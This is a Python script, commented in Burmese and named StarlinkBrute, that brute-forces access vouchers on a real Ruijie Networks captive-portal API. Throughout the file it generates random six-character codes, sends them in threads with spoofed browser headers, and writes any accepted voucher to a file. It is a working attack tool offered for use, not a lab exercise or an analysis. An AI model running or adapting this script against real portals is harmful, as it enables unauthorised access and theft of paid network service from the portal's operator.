import requests
import random
import string
import os
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# အရောင်အသွေးများ သတ်မှတ်ခြင်း (Terminal output အတွက်)
G = '\033[1;32m' # Green
R = '\033[1;31m' # Red
W = '\033[1;37m' # White
Y = '\033[1;33m' # Yellow

class StarlinkBrute:
    def __init__(self):
        self.url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://portal-as.ruijienetworks.com",
            "Referer": "https://portal-as.ruijienetworks.com/index.html"
        }
        self.session_id = None

    def banner(self):
        os.system('clear')
        print(f"""{G}
   ____ _             _ _       _    
  / ___| |_ __ _ _ __| (_)_ __ | | __
  \___ \ __/ _` | '__| | | '_ \| |/ /
   ___) | || (_| | |  | | | | | |   < 
  |____/ \__\__,_|_|  |_|_|_| |_|_|\_\\
        {W}Multi-Voucher Brute-force Logic
        """)

    def generate_voucher(self, length=6):
        """ဂဏန်းနှင့် အင်္ဂလိပ်စာလုံး ရောနှောထားသော Voucher ထုတ်ပေးခြင်း"""
        chars = string.ascii_uppercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def check_connection(self):
        """Internet access ရှိမရှိ အရင်စစ်ဆေးခြင်း"""
        try:
            requests.get("https://www.google.com", timeout=3)
            return True
        except:
            return False

    def attack(self, voucher):
        """Voucher တစ်ခုချင်းစီကို Server ထံ ပို့ဆောင်စစ်ဆေးခြင်း"""
        data = {
            "voucher": voucher,
            "sessionId": self.session_id if self.session_id else ""
        }
        
        try:
            response = requests.post(self.url, json=data, headers=self.headers, timeout=10)
            res_json = response.json()

            # Server ရဲ့ response ကို စစ်ဆေးခြင်း
            if "success" in res_json.get("message", "").lower() or res_json.get("code") == 0:
                print(f"{G}[SUCCESS] {W}Valid Voucher Found: {G}{voucher}")
                with open("success.txt", "a") as f:
                    f.write(f"{datetime.now()} - {voucher}\n")
                return True
            else:
                print(f"{R}[FAILED] {W}Testing: {voucher} - {res_json.get('message', 'Invalid')}")
                return False
        except Exception as e:
            # print(f"{R}[ERROR] Connection issue for {voucher}")
            return False

    def start(self, thread_count=10):
        self.banner()
        print(f"{Y}[*] Checking Portal Status...")
        
        # Internet ရနေပြီဆိုရင် ရပ်တန့်ရန်
        if self.check_connection():
            print(f"{G}[!] Already Connected to Internet!")
            # return

        print(f"{Y}[*] Starting Brute-force with {thread_count} threads...")
        print(f"{W}{'-'*45}")

        # ThreadPool သုံးပြီး တစ်ပြိုင်နက်တည်း လုပ်ဆောင်ခြင်း
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            while True:
                vouchers = [self.generate_voucher() for _ in range(thread_count)]
                results = list(executor.map(self.attack, vouchers))
                
                if True in results:
                    print(f"\n{G}[+] Done! Valid voucher saved in success.txt")
                    break

if __name__ == "__main__":
    try:
        app = StarlinkBrute()
        # Thread အရေအတွက်ကို စိတ်ကြိုက်ချိန်နိုင်သည် (ဥပမာ - ၅ သို့မဟုတ် ၁၀)
        app.start(thread_count=5)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user.")
        
